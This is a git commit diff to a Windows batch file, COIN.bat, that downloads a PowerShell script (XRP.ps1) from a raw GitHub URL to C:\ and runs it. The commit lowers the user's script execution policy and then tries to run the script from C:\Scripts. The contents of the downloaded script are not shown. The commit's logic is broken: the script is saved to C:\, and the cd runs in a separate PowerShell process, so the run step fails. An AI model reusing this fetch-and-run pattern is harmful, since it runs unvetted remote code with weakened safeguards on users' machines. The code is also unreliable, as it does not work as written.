ff64853db97e59cae5287b73aa2749b8deb7eed2
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 11:09:57 +0700

    COIN.bat

--- COIN.bat
+++ COIN.bat
@@ -1,4 +1,6 @@
 @echo off
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1' -OutFile 'C:\XRP.ps1'"
-powershell.exe -ExecutionPolicy Bypass -File 'C:\XRP.ps1'
+powershell -NoProfile -Command "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned"
+powershell -NoProfile -Command "cd 'C:\Scripts'"
+powershell -NoProfile -Command ".\XRP.ps1"
 exit
